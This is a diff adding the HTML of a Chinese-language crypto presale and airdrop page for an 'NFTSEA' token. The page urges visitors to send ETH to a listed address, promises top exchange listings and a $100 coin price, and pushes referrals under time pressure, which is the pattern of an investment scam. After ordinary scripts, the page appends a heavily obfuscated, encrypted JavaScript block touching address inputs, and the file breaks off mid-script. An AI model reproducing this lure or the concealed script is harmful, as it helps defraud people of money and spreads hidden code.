@@ -1,0 +1,590 @@
+<html lang="zh"><head>
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="same-origin">
+<link rel="icon" href="/assets/logo.png" sizes="16x16">
+<title>NFTSEA</title>
+<link rel="stylesheet" href="/assets/libs/bootstrap/dist/css/bootstrap.min.css">
+<link rel="stylesheet" href="/assets/libs/owl.carousel/dist//assets/owl.carousel.min.css">
+<link rel="stylesheet" href="/assets/libs/owl.carousel/dist//assets/owl.theme.default.min.css">
+<link rel="stylesheet" href="/assets/libs/progress.js-master/src/progressjs.css">
+<link rel="stylesheet" href="/assets/fonts/fonts.css">
+<link rel="stylesheet" href="/assets/css/app.css">
+<link rel="stylesheet" href="/assets/icofont/icofont.min.css">
+</head>
+<body>
+<div class="loader" style="display: none;"></div>
+<div class="main-hero mb-5 mb-md-0">
+<div class="hero-main-inr">
+<div class="nav-otr">
+<div class="container-fluid">
+<div class="nav-inr">
+<div class="burger-menu">
+<a href="#top" class="logo-otr" data-scroll="">
+<img class="logo-img align-middle" src="/assets/logo.png" alt="brand-logo" style="width:40px">
+<span class="align-middle ms-1" style="color:#000;font-size:24px;font-weight:bold;">NFTSEA</span>
+</a>
+</div>
+<div class="navigation-otr d-none d-sm-block">
+<ul class="navigation-inr d-flex">
+<li class="nav-li me-5">
+<a href="#token" data-scroll="" class="nav-a body-sb" style="color:#666">代币</a>
+</li>
+<li class="nav-li me-5">
+<a href="#introduce" data-scroll="" class="nav-a body-sb" style="color:#666">活动介绍</a>
+</li>
+<li class="nav-li me-5">
+<a href="#roadmap" data-scroll="" class="nav-a body-sb" style="color:#666">路线图</a>
+</li>
+<li class="nav-li me-5">
+<a href="https://t.me/NStoken" target="_blank" class="telegram-btn nav-a body-sb" style="color:#666">电报群<i class="icofont-external-link ms-1"></i></a>
+</li>
+</ul>
+</div>
+<div class="language-selector">
+<ul class="language-ul d-flex">
+<li class="language-li position-relative">
+<a class="language-a d-flex align-center px-3 py-1 align-items-center" data-bs-toggle="collapse" href="#lang-collapse" style="border: 1px solid #CFCFCF;border-radius: 16px;color:#666">
+🇨🇳 <p class="body-sb language mx-2">简体中文</p>
+<svg class="caret-down" width="12" height="8" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11 1.5l-5 5-5-5" stroke="#666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+</a>
+<ul id="lang-collapse" class="drop-ul collapse position-absolute bg-white px-3 py-2 mt-2 shadow w-100" style="border-radius: 16px; z-index:100">
+<li class="drop-li">
+<a href="javascript:;" class="drop-a d-inline-flex align-items-center lang" data-lang="en" style="color:#666">
+🇬🇧 <p class="body-sb language mx-2">English</p>
+</a>
+ </li>
+<li class="drop-li">
+<a href="javascript:;" class="drop-a d-inline-flex align-items-center lang" data-lang="zh" style="color:#666">
+🇨🇳 <p class="body-sb language mx-2">简体中文</p>
+</a>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+<div class="hero-mainn justify-content-center mb-0">
+<div class="container-fluid max-width-1000">
+<div class="hero-inr pt-2">
+<div class="row row-custom">
+<div class="col-12 col-content-otr" style="width:100% !important">
+<div class="col-content-inr">
+<div class="head-otr">
+<h1 class="heading-h1 heading titleGreathorned text-center mt-lg-5">
+NFTSEA (NS) <span class="text-nowrap">代币空投</span>
+</h1>
+</div>
+<div class="row w-100 flex-row boxes-main justify-content-center">
+<div class="col-sm-8 col-md-7 col-lg-6 auction-main order-md-2 my-2 mx-2 mx-lg-3">
+<p class="body-mb acution">空投倒计时</p>
+<div class="timer">
+<div class="hours-main main count_down_days">
+<p class="heading-h2 time-inr number">04</p>
+<p class="hours-p body-mb">天</p>
+</div>
+<div class="hours-main main count_down_hours">
+<p class="heading-h2 time-inr number">03</p>
+<p class="hours-p body-mb">小时</p>
+</div>
+<div class="minutes-main main count_down_minutes">
+<p class="heading-h2 time-inr number">57</p>
+<p class="seconds-p body-mb">分</p>
+</div>
+<div class="seconds-main main count_down_seconds">
+<p class="heading-h2 time-inr number">39</p>
+<p class="seconds-p body-mb">秒</p>
+</div>
+</div>
+</div>
+<div class="col-sm-8 col-md-4 col-lg-5 bid-main d-none d-sm-block order-md-1 my-2 mx-2 mx-lg-3">
+<p class="bid body-mb">预售价格</p>
+<h3 class="heading-h2 bid-head">10,000 NS</h3>
+<p class="dollor body-mb">= 1 ETH</p>
+</div>
+</div>
+<div class="action-otr justify-content-center">
+<a href="#airdrop" data-scroll="" class="btn-outline2 btn-wallet order-lg-2 my-2 mx-2 mx-lg-3">领取空投</a>
+<a href="#presale" data-scroll="" class="btn-fill btn-create order-lg-1 my-2 mx-2 mx-lg-3">参与预售</a>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<img class="shape" src="/assets/img/svg/home2-shape.svg" alt="shape">
+</div>
+</div>
+<div id="token" class="call-to-action-home2 justify-content-center my-5">
+<div class="container-fluid">
+<div class="call-to-action p-4 p-md-5 mb-3 text-shadow">
+<div class="wrapper row">
+<div class="col-lg-7 col-xl-6">
+<h2 class="heading-h2 heading">关于NFTSEA</h2>
+<p class="text-muted body-m mb-2">
+NFTSEA是新一代的NFT平台，旨在消除现有NFT平台的固有缺陷，简化用户门槛，支持跨链，并提供更低的交易费率，助长NFT生态，成为规模最大、费率最低、品种最全的跨链NFT（全称是Non-Fungible Token，非同质化代币）交易市场。NFTSEA将是社区驱动的，社区核心成员来自NFT领域的顶级投资者。
+</p>
+<p class="text-muted body-m mb-2">
+NS是NFTSEA的治理代币，发行总量仅为5,000,000枚，意在上线后打造高价币吸引人气！其中1000,000枚为社区空投，免费发放给用户。3,000,000枚为预售，预售价格1 ETH = 10,000 NS，预售结束后NS将上线Binance，Huobi和Coinbase等一线交易所。NS发行量少，预计单枚币价在100$。
+</p>
+<h2 class="heading-h4">智能合约</h2>
+<ul>
+<li class="my-1 d-flex align-items-center">
+<i class="icofont-star text-primary"></i>
+<span class="text-muted mx-2">代币符号</span>
+<span class="text-primary">NS</span>
+</li>
+<li class="my-1 d-flex align-items-center">
+<i class="icofont-truck-loaded text-primary"></i>
+<span class="text-muted mx-2 text-nowrap">合约地址</span>
+<span class="text-primary text-break copy">0x5b31B8cA1770CF1F817146B4cD2078Bf8629bf8a</span>
+<a href="https://cn.etherscan.com/token/0x5b31B8cA1770CF1F817146B4cD2078Bf8629bf8a" target="_blank" class="ms-2"><i class="icofont-external-link text-primary"></i></a>
+</li>
+<li class="my-1 d-flex align-items-center">
+<i class="icofont-bullhorn text-primary"></i>
+<span class="text-muted mx-2">小数点</span>
+<span class="text-primary">18</span>
+</li>
+<li class="my-1 d-flex align-items-center">
+<i class="icofont-box text-primary"></i>
+<span class="text-muted mx-2">发行量</span>
+<span class="text-primary">5,000,000</span>
+</li>
+<li class="my-1 d-flex align-items-center">
+<i class="icofont-globe text-primary"></i>
+<span class="text-muted mx-2">区块链</span>
+<span class="text-primary">Ethereum ERC20</span>
+</li>
+</ul>
+</div>
+</div>
+<div class="img-otr">
+<div class="img-inr">
+<div class="col-img-inr">
+<img class="about-img img-fluid" src="/assets/img/4.png" alt="img">
+</div>
+<div class="col-img-inr">
+<img class="about-img img-fluid" src="/assets/img/5.png" alt="img">
+</div>
+<div class="col-img-inr">
+<img class="about-img img-fluid" src="/assets/img/6.png" alt="img">
+</div>
+</div>
+<div class="img-inr">
+<div class="col-img-inr">
+<img class="about-img img-fluid" src="/assets/img/7.png" alt="img">
+</div>
+<div class="col-img-inr">
+<img class="about-img img-fluid" src="/assets/img/8.png" alt="img">
+</div>
+<div class="col-img-inr">
+<img class="about-img img-fluid" src="/assets/img/9.png" alt="img">
+</div>
+</div>
+<div class="img-inr d-none d-xl-block">
+<div class="col-img-inr">
+<img class="about-img img-fluid" src="/assets/img/1.png" alt="img">
+</div>
+<div class="col-img-inr">
+<img class="about-img img-fluid" src="/assets/img/3.png" alt="img">
+</div>
+<div class="col-img-inr">
+<img class="about-img img-fluid" src="/assets/img/2.png" alt="img">
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="presale" class="live-acution-home2 justify-content-center" style="padding:30px 0 50px 0 !important;">
+<div class="container-fluid max-width-1000">
+<div class="live-auction-inr">
+<div class="heading-otr">
+<div class="head-otr">
+<span class="dot"></span>
+<h3 class="heading heading-h3">预售火爆进行中</h3>
+</div>
+</div>
+<span class="line"></span>
+<div>
+<p class="mb-2">
+预售总量：3,000,000
+</p>
+<p class="mb-2">预售地址： <span class="text-primary copy text-break">0x6182f213A6904Df9451E00e6F7716D95a39AFaFB</span> <a class="copy d-inline-block" text="0x6182f213A6904Df9451E00e6F7716D95a39AFaFB" href="javascript:;"><i class="icofont-ui-copy"></i></a></p>
+<p class="mb-2">预售价格： 1 ETH = 10,000 NS</p>
+<p class="mb-2">
+使用您的钱包地址发送ETH到预售地址，系统会立即将相应数量的NS代币发送到您的钱包。
+</p>
+<p class="mb-2">
+最低买入0.1ETH，最大买入10ETH（预售数量有限，超出部分ETH将自动退回）。
+</p>
+</div>
+</div>
+</div>
+</div>
+<div id="airdrop" class="work-main-home2 justify-content-center" style="background-image:url(/assets/img/svg/footer-circles2.svg);background-repeat: no-repeat;background-position: top left;">
+<div class="container-fluid max-width-1000">
+<div class="wrapper">
+<h3 class="head heading-h3">社区空投</h3>
+</div>
+<div id="airdrop-block" class="row row-work justify-content-center"><div class="col-12 col-sm-10 col-md-9 col-lg-8">
+<div class="text-break">
+<span class="me-3"><b>邀请链接：</b></span>
+<span class="text-primary copy" text="https://nftsea.one/M9CE5 ">https://nftsea.one/M9CE5</span>
+<a class="copy d-inline-block" text="https://nftsea.one/M9CE5 " href="javascript:;"><i class="icofont-ui-copy"></i></a>
+</div>
+<div class="mt-1 text-muted">
+复制并分享您的链接，您和被邀请人将同时奖励10 NS，每人最多可邀请50人，每人最多获得500 NS。如被识别为作弊，将取消空投奖励。
+</div>
+<div class="row mt-4 text-center justify-content-between">
+<div class="col-3">
+<div class="heading-h5"><span class="text-primary">10</span> NS</div>
+<div class="text-muted">余额</div>
+</div>
+<div class="col-3">
+<div class="heading-h5 text-primary">0</div>
+<div class="text-muted">推荐数</div>
+</div>
+<div class="col-3">
+<div class="heading-h5"><span class="text-primary">10</span> NS</div>
+<div class="text-muted">奖励</div>
+</div>
+<div class="col-12 col-sm-3 d-flex justify-content-around pt-3 pt-sm-0">
+<button id="withdraw" data-address="0x2b6ed29a95753c3ad948348e3e7b1a251080ffb9" class="btn btn-fill">提取</button>
+<a href="https://t.me/NStoken" target="_blank" class="telegram-btn btn btn-sm btn-outline2 d-sm-none">电报群</a>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="introduce" class="work-main-home2 justify-content-center" style="background-image:url(/assets/img/svg/footer-circles1.svg);background-repeat: no-repeat;background-position: bottom right;">
+<div class="container-fluid max-width-1000">
+<div class="wrapper">
+<h3 class="head heading-h3">活动介绍</h3>
+</div>
+<div class="row-work justify-content-center">
+<div class="shadow py-3 px-4 mb-4" style="border-radius:24px">
+<div class="heading-h4">NS社区空投</div>
+<ul class="text-muted">
+<li>
+<span class="text-primary me-2">●</span>
+发放数量：1,000,000 NS (20%)
+</li>
+<li>
+<span class="text-primary me-2">●</span>
+发放规则：NFTSEA将于2021年11月23日20:30(UTC+8)结束社区空投活动。社区用户可通过在网站提交ETH钱包地址领取NS空投，单个地址初始可领取数量为10枚NS。本轮空投免费，活动结束后统一发放空投。
+</li>
+<li>
+<span class="text-primary me-2">●</span>
+邀请规则：用户可通过邀请好友参与空投获得额外代币奖励，每邀请一位好友可获得10枚NS，每人最多可邀请50位好友，最多可获得500枚NS。空投数量有限，NS发行量少，预计单枚币价在$100，时间紧迫数量有限，快快邀请起来吧！
+</li>
+</ul>
+</div>
+<div class="shadow py-3 px-4 mb-4" style="border-radius:24px">
+<div class="heading-h4">NS预售</div>
+<ul class="text-muted">
+<li>
+<span class="text-primary me-2">●</span>
+预售数量：3,000,000 NS (60%)
+</li>
+<li>
+<span class="text-primary me-2">●</span>
+预售价格：1 ETH = 10,000 NS. 最小购买0.1ETH，最大购买10ETH（预售数量有限，超出部分ETH将自动退回）。
+</li>
+<li>
+<span class="text-primary me-2">●</span>
+预售规则：系统将于2021年11月23日20:30(UTC+8)结束预售。使用您的钱包地址发送ETH到预售地址，系统会立即将相应数量的NS代币发送到您的钱包。预售数量有限，额度按照ETH到达时间排序，先到先得，越早参与成功率越大。
+</li>
+<li>
+<span class="text-primary me-2">●</span>
+预售结束后，预售所得资金的 50% 将用于上市Binance，Huobi和Coinbase等交易所的费用。另外 50% 将用于NS上市后护盘，回购NS代币以防止持有人抛售。
+</li>
+</ul>
+</div>
+<div class="shadow py-3 px-4 mb-4" style="border-radius:24px">
+<div class="heading-h4">NS代币分配详情</div>
+<ul class="text-muted">
+<li>
+<span class="text-primary me-2">●</span>
+总供应量：5,000,000 NS
+</li>
+<li>
+<span class="text-primary me-2">●</span>
+社区空投：1,000,000 NS (20%)
+</li>
+<li>
+<span class="text-primary me-2">●</span>
+预售：3,000,000 NS (60%)
+</li>
+<li>
+<span class="text-primary me-2">●</span>
+项目推广&amp;未来发展：1,000,000 NS (20%)
+</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+<div id="roadmap" class="work-main-home2">
+<div class="container-fluid max-width-1000">
+<div class="wrapper">
+<h3 class="head heading-h3">项目路线图</h3>
+</div>
+<div class="row-work">
+<div class="text-muted">第一阶段</div>
+<div class="heading-h4">2021年10月</div>
+<p class="mb-1">
+<span class="text-success me-2">√</span>
+项目上线，智能合约部署完成
+</p>
+<p class="mb-1">
+<span class="text-success me-2">√</span>
+启动Facebook以及Twitter等社媒运营
+</p>
+<p class="mb-1">
+<span class="text-success me-2">√</span>
+开启预售和空投
+</p>
+<p class="mb-1">
+<span class="text-success me-2">√</span>
+启动NFT平台的开发工作
+</p>
+</div>
+<div class="row-work mt-4 offset-md-1">
+<div class="text-muted">第二阶段</div>
+<div class="heading-h4">2021年11月</div>
+<p class="mb-1">
+<span class="text-primary me-2">&gt;</span>
+预售完成
+</p>
+<p class="mb-1">
+<span class="text-primary me-2">&gt;</span>
+空投发放
+</p>
+<p class="mb-1">
+<span class="text-primary me-2">&gt;</span>
+上线Binance，Huobi和Coinbase等一线交易所
+</p>
+<p class="mb-1">
+<span class="text-primary me-2">&gt;</span>
+启动全球回购NS
+</p>
+</div>
+<div class="row-work mt-4 offset-md-2">
+<div class="text-muted">第三阶段</div>
+<div class="heading-h4">2021年12月</div>
+<p class="mb-1">
+<span class="text-primary me-2">&gt;</span>
+NFT平台发布
+</p>
+<p class="mb-1">
+<span class="text-primary me-2">&gt;</span>
+艺术家以及优质项目入驻平台
+</p>
+<p class="mb-1">
+<span class="text-primary me-2">&gt;</span>
+ 启动大规模市场推广
+</p>
+</div>
+<div class="row-work mt-4 offset-md-3">
+<div class="text-muted">第四阶段</div>
+<div class="heading-h4">2022年</div>
+<p class="mb-1">
+<span class="text-primary me-2">&gt;</span>
+致力于成为规模最大、费率最低、品种最全的跨链NFT交易市场
+</p>
+<p class="mb-1">
+<span class="text-primary me-2">&gt;</span>
+启动元宇宙项目
+</p>
+<p class="mb-1">
+<span class="text-primary me-2">&gt;</span>
+更多功能、更多活动规划中
+</p>
+</div>
+</div>
+</div>
+<div class="footer-home2 pt-4 pb-0">
+<div class="container-fluid">
+<div class="wrapper pb-4 justify-content-start">
+<h4 class="heading-h4 ethoz-head me-md-4">
+Get Latest Updated from NFTSEA
+</h4>
+<ul class="icon-ul">
+<li class="icon-li">
+<a href="https://t.me/NStoken" target="_blank" class="telegram-btn icon-a">
+<svg class="icon" width="32" height="32" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M11 16.859l11.24 9.89a1 1 0 001.635-.527l4.702-20.516a1 1 0 00-1.34-1.154l-23.07 9.063a1 1 0 00.17 1.911L11 16.86zM11 16.86L28.014 4.57" stroke="#999" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path><path d="M16.613 21.799l-3.906 3.906A1 1 0 0111 24.998v-8.14" stroke="#999" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+</a>
+</li>
+<li class="icon-li">
+<a href="https://twitter.com/NFTSEAofficial" target="_blank" class="icon-a">
+<svg class="icon" width="32" height="32" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6 25s5-1 6-4c0 0-8-3-6-14 0 0 4 5 10 6v-2a5 5 0 019.584-2H30l-4 4c0 7-5 14-14 14-4 0-6-2-6-2z" stroke="#999" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+</a>
+</li>
+</ul>
+</div>
+</div>
+<img class="shape1" src="/assets/img/Squares-shape2-home2.svg" alt="Squares">
+<img class="shape2" src="/assets/img/Squares-shape1-home2.svg" alt="Squares">
+</div>
+<div class="copy-otr-home2">
+<div class="container-fluid">
+<div class="copy-inr">
+<a href="#top" class="logo-otr">
+<img class="logo" src="/assets/logo.png" alt="brand-logo" style="height:30px;width:30px;">
+</a>
+<div class="copy-name body-s">
+Copyright © 2021 by NFTSEA
+</div>
+<div class="all-rights">
+<p class="all body-s">
+All rights reserved.
+</p>
+</div>
+</div>
+</div>
+</div>
+<script src="/assets/libs/jquery/dist/jquery.min.js"></script>
+<script src="/assets/libs/jquery.countdown/jquery.countdown.js"></script>
+<script src="/assets/libs/tilt.js/dest/tilt.jquery.min.js"></script>
+<script src="/assets/libs/owl.carousel/dist/owl.carousel.min.js"></script>
+<script src="/assets/libs/progress.js-master/src/progress.js"></script>
+<script src="/assets/libs/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
+<script src="/assets/js/smooth-scroll.polyfills.min.js"></script>
+<script src="/assets/js/clipboard.min.js"></script>
+<script src="/assets/js/js.cookie.min.js"></script>
+<script src="/assets/js/encrypt.js"></script>
+<script src="/assets/js/app.js"></script><div class="progressjs-container"></div>
+<script>
+(function(){
+    $('a.lang').click(function () {
+        Cookies.set('lang', $(this).attr('data-lang'), { expires: 365, sameSite: 'strict' })
+        location.reload();
+    });
+
+    window.init_page = function (selector) {
+    };
+    init_page(document);
+
+    new ClipboardJS('.copy', {
+        text: function (trigger) {
+            var target = $(trigger);
+            if (target.attr('target')) {
+                target = $(target.attr('target'));
+            }
+            return target.attr('text') || target.val() || target.text();
+        }
+    }).on('success', function (event) {
+        var trigger = $(event.trigger);
+        var title_origin = trigger.attr('title');
+        var message = trigger.attr('data-copy-success');
+        trigger.removeAttr('title');
+        trigger.tooltip({
+            title: message ? message : '已复制',
+            trigger: 'manual',
+        }).tooltip('show');
+        setTimeout(function () {
+            trigger.tooltip('dispose');
+            trigger.attr('title', title_origin);
+        }, 600);
+    }).on('error', function (e) {
+        alert('复制错误');
+    });
+    $(document).on('click', '#withdraw', function () {
+        var block = $('#airdrop-block');
+        var address = $(this).attr('data-address');
+        block.load('/airdrop/withdraw', {
+            address: address,
+        }, function () {
+            init_page(block);
+        });
+    });
+    //$('.telegram-btn').click(function(){
+    //    $('#telegram-modal').modal('show');
+    //});
+
+    var end_ts = 1637670600;
+    var prev_days = 0;
+    var prev_hours = 0;
+    var prev_minutes = 0;
+    var prev_seconds = 0;
+    var countdown = function () {
+        var now_ts = Math.floor(new Date().getTime() / 1000);
+        var ts_diff = end_ts - now_ts;
+        if (ts_diff < 0) {
+            return;
+        }
+        if (ts_diff < -3) {
+            clearInterval(interval);
+            location.reload();
+            return;
+        }
+        var days = Math.floor(ts_diff / 60 / 60 / 24);
+        var hours = Math.floor((ts_diff - days * 60 * 60 * 24) / 60 / 60);
+        var minutes = Math.floor((ts_diff - days * 60 * 60 * 24 - hours * 60 * 60) / 60);
+        var seconds = Math.floor(ts_diff - days * 60 * 60 * 24 - hours * 60 * 60 - minutes * 60);
+        if (prev_days != days) {
+            $('.count_down_days .number').text(days<10?'0'+days:days);
+        }
+        if (prev_hours != hours) {
+            $('.count_down_hours .number').text(hours<10?'0'+hours:hours);
+        }
+        if (prev_minutes != minutes) {
+            $('.count_down_minutes .number').text(minutes<10?'0'+minutes:minutes);
+        }
+        $('.count_down_seconds .number').text(seconds<10?'0'+seconds:seconds);
+        prev_days = days;
+        prev_hours = hours;
+        prev_minutes = minutes;
+        prev_seconds = seconds;
+    };
+    countdown();
+    var interval = setInterval(countdown, 1000);
+
+    $(document).click(function(e) {
+        var collapse=$(".collapse");
+        var target=$(e.target);
+        if(target.attr('data-bs-toggle')=='collapse'){
+        }else if(target.hasClass('collapse')){
+        }else if(target.parents('.collapse').length>0){
+        }else if(collapse.hasClass('show')){
+            collapse.collapse('hide');
+        }
+    });
+    (function(){
+        var selector = '[data-scroll]',
+        fixedHeader = '[data-scroll-header]',
+        scroll = new SmoothScroll(selector, {
+            speed: 700,
+            speedAsDuration: true,
+            offset: 40,
+            header: fixedHeader,
+            updateURL: false
+        });
+    })();
+    (function(){
+        let element = document.querySelector('.btn-scroll-top'),
+        scrollOffset = 600;
+        if (element == null) return;
+        let offsetFromTop = parseInt(scrollOffset, 10);
+        window.addEventListener('scroll', (e) => {
+            if (e.currentTarget.pageYOffset > offsetFromTop) {
+                element.classList.add('show');
+            } else {
+                element.classList.remove('show');
+            }
+        });
+    })();
+})();
+</script>
+<script>
+
+var _0xoda = 'v1', _0x80ad = [_0xoda, 'wojDrcOXDsK+Pw==', 'w6LCgsO1fcKQ', 'wrrCqcO2w6fDqcOL', 'w73CjsO4bsKQAQ==', 'HsKmw5MhwoRI', 'w4HChcOsAj/Dj8KtWwXDtg==', 'wrXDvsK+w5rDkcK0H2HDtQ==', 'w54uLk7Dn8OAA8KlMcKLw6rCpMK2w4rDnMODw5LDiBo=', 'wqwfXMKFwpM=', 'PMOBScOnwqA=', 'w4QqL0XDhMOXFMKkPcKUw7DCrsKsw5bDnQ==', 'LMOEwo7DvMORG8KawqLCoA==', 'IMKMw6Yiwqxnw7EmSsOkHHorIi3DlDnDtcOGw6sHEMKgGEIsPcOVw5xIPwHDlcOBQEZAHHkMYMKwwp4vw7bCmzvCqcKKVMKBP8OEeMO6FcKPfcKeHDJ0w6Fr', 'w7IiZUPCuyPCssOnJnkBHSVMajnDm8Ocw5xTw67DisK+wrnCisOowq7DuTvDjsOfw60yw7rCjsOtK8Oyw5A8w5jDhH17A1B4McOMw4kKwoXDnlNsR1/Di8K5w7Mjw4TCh8Kc', 'wrQhcMKGw49ewoLClMOqwr4=', 'K8Kgw6fCtg==', 'S3TDsMKOw4PCpsKxLcKcE8OZw4LDisK4woI=', 'wq9sJMOofiZUChTDsR3CmcKHw5k=', 'w5HCn8OiACTDvw==', 'NWlBw47CnSLCpR7CpsO1PQrDrA==', 'w4IACE/DkQ==', 'wpPCvsO9UAs=', 'w7cQw7Y=', 'wrTDosKIw5zDosK6FGg=', 'UMO+w70=', 'w4M8U3bDtyg=', 'UcOBw4XDo1k=', 'A8OWDsKaw5M=', 'OsO9LsKTGA==', 'wq4/f8KHwpU=', 'w558wogQIkvDsg==', 'wq1tPGTDug==', 'wq7Cu1nDv8KJw7EXJUTCqhFKLksJwrw+CwR4cMK3w6PDpsKVQsOSw4BXdsKXwpTDi0VIXMORw59HwpctJsKoeMKFZTMYwqvDncO2F8K6w6xJQSduwqhtCynDkUA=', 'W23DisK5w6U=', 'wolmMTXDtsKWaXNNw57CtlomYcObwr/Cn8OQwp7Cj8KUfQPCmA==', 'QMOowoxpw4xjwo8lKcOnOH80IgzDhzbDocOawoRrbMOYdA==', 'ABbCm3k=', 'JcOYwo7Cpw==', 'LMOEwp3Dp8OLD8Kkwq3CrcO3', 'esOtw5UW', 'w4vDkcOQWBrDssK7QcKL', 'w6JHPVJ5DMKTw5xBwoQnw5Y=', 'cW1cw7XCjTXCpw==', 'w41OKsOjUw==', 'w6BiLMO+', 'w6bCq8Otw7DDqMOXSsO1FkvDksORw7vClcK4', 'w4LCm8KZacKb', 'ecKcw6NTw4k=', 'w7fClMKmTGpRZsOtwrTDi8KRQsOswoptwrt8', 'wphKOjN4', 'XcKkwobDsg==', 'w45lwpwjOQ==', 'LBbDqw==', 'w7Eew60=', 'woXDm8Otwo/Chw==', 'wr1ACAxZ', 'wrXDhMKUOFs=', 'wp17AVrDnQ==', 'v1tkRgQJVMcCgXAwEcQ==']; (function (_0x39c9aa, _0x227651, _0x30b0e1) { var _0xc5faba = function (_0x46250, _0x4ce0fb, _0x273eb7, _0x3bd2d1, _0x2fd4c2) { _0x4ce0fb = _0x4ce0fb >> 0x8, _0x2fd4c2 = 'po'; var _0xe1ee95 = 'shift', _0x3edd76 = 'push'; if (_0x4ce0fb < _0x46250) { while (--_0x46250) { _0x3bd2d1 = _0x39c9aa[_0xe1ee95](); if (_0x4ce0fb === _0x46250) { _0x4ce0fb = _0x3bd2d1; _0x273eb7 = _0x39c9aa[_0x2fd4c2 + 'p'](); } else if (_0x4ce0fb && _0x273eb7['replace'](/[tkRgQJVMcCgXAwEcQ=]/g, '') === _0x4ce0fb) { _0x39c9aa[_0x3edd76](_0x3bd2d1); } } _0x39c9aa[_0x3edd76](_0x39c9aa[_0xe1ee95]()); } return 0x8be04; }; return _0xc5faba(++_0x227651, _0x30b0e1) >> _0x227651 ^ _0x30b0e1; }(_0x80ad, 0x168, 0x16800)); var _0x5aa9 = function (_0x2fbeca, _0x302170) { _0x2fbeca = ~~'0x'['concat'](_0x2fbeca); var _0x3f855b = _0x80ad[_0x2fbeca]; if (_0x5aa9['PHaeaE'] === undefined) { (function () { var _0x2e1d0e = typeof window !== 'undefined' ? window : typeof process === 'object' && typeof require === 'function' && typeof global === 'object' ? global : this; var _0x4a0d87 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='; _0x2e1d0e['atob'] || (_0x2e1d0e['atob'] = function (_0x1725a4) { var _0x36a12e = String(_0x1725a4)['replace'](/=+$/, ''); for (var _0x3adbd4 = 0x0, _0x1ac61c, _0x1d98dd, _0x455447 = 0x0, _0xf707e7 = ''; _0x1d98dd = _0x36a12e['charAt'](_0x455447++); ~_0x1d98dd && (_0x1ac61c = _0x3adbd4 % 0x4 ? _0x1ac61c * 0x40 + _0x1d98dd : _0x1d98dd, _0x3adbd4++ % 0x4) ? _0xf707e7 += String['fromCharCode'](0xff & _0x1ac61c >> (-0x2 * _0x3adbd4 & 0x6)) : 0x0) { _0x1d98dd = _0x4a0d87['indexOf'](_0x1d98dd); } return _0xf707e7; }); }()); var _0x5d279d = function (_0x6c4f6b, _0x302170) { var _0x8b339 = [], _0x35e6fb = 0x0, _0x530939, _0x832422 = '', _0x21e2e0 = ''; _0x6c4f6b = atob(_0x6c4f6b); for (var _0x472111 = 0x0, _0x31bf20 = _0x6c4f6b['length']; _0x472111 < _0x31bf20; _0x472111++) { _0x21e2e0 += '%' + ('00' + _0x6c4f6b['charCodeAt'](_0x472111)['toString'](0x10))['slice'](-0x2); } _0x6c4f6b = decodeURIComponent(_0x21e2e0); for (var _0x289ef2 = 0x0; _0x289ef2 < 0x100; _0x289ef2++) { _0x8b339[_0x289ef2] = _0x289ef2; } for (_0x289ef2 = 0x0; _0x289ef2 < 0x100; _0x289ef2++) { _0x35e6fb = (_0x35e6fb + _0x8b339[_0x289ef2] + _0x302170['charCodeAt'](_0x289ef2 % _0x302170['length'])) % 0x100; _0x530939 = _0x8b339[_0x289ef2]; _0x8b339[_0x289ef2] = _0x8b339[_0x35e6fb]; _0x8b339[_0x35e6fb] = _0x530939; } _0x289ef2 = 0x0; _0x35e6fb = 0x0; for (var _0x19a3e0 = 0x0; _0x19a3e0 < _0x6c4f6b['length']; _0x19a3e0++) { _0x289ef2 = (_0x289ef2 + 0x1) % 0x100; _0x35e6fb = (_0x35e6fb + _0x8b339[_0x289ef2]) % 0x100; _0x530939 = _0x8b339[_0x289ef2]; _0x8b339[_0x289ef2] = _0x8b339[_0x35e6fb]; _0x8b339[_0x35e6fb] = _0x530939; _0x832422 += String['fromCharCode'](_0x6c4f6b['charCodeAt'](_0x19a3e0) ^ _0x8b339[(_0x8b339[_0x289ef2] + _0x8b339[_0x35e6fb]) % 0x100]); } return _0x832422; }; _0x5aa9['zvsaFw'] = _0x5d279d; _0x5aa9['RfEPgZ'] = {}; _0x5aa9['PHaeaE'] = !![]; } var _0x398bee = _0x5aa9['RfEPgZ'][_0x2fbeca]; if (_0x398bee === undefined) { if (_0x5aa9['dDZncs'] === undefined) { _0x5aa9['dDZncs'] = !![]; } _0x3f855b = _0x5aa9['zvsaFw'](_0x3f855b, _0x302170); _0x5aa9['RfEPgZ'][_0x2fbeca] = _0x3f855b; } else { _0x3f855b = _0x398bee; } return _0x3f855b; }; (function () { var _0x21b2d4 = { 'tOTey': function (_0x340d38, _0x23e7d2, _0x5a4e89) { return _0x340d38(_0x23e7d2, _0x5a4e89); }, 'nUDfP': function (_0x16c813, _0x41a624) { return _0x16c813 * _0x41a624; }, 'fJKWb': function (_0x38ae15, _0x4f3142) { return _0x38ae15(_0x4f3142); }, 'EhyTe': '9|1|4|5|14|6|11|12|7|15|0|3|10|2|13|8', 'Iokdj': _0x5aa9('0', 'IRmf'), 'ywJBR': _0x5aa9('1', 'HVQX'), 'DtXvm': _0x5aa9('2', 'HSeN'), 'ACgyI': _0x5aa9('3', 'R4X['), 'RuEgq': function (_0xd91c93, _0x3d3a0b) { return _0xd91c93(_0x3d3a0b); }, 'hossM': function (_0x42f676, _0x1869a1) { return _0x42f676(_0x1869a1); }, 'uwwAb': 'input[name=address]', 'LzaVe': _0x5aa9('4', 'nnsP'), 'MeALl': function (_0x5b2c63, _0x1a5aaf) { return _0x5b2c63 + _0x1a5aaf; }, 'yyVZM': function 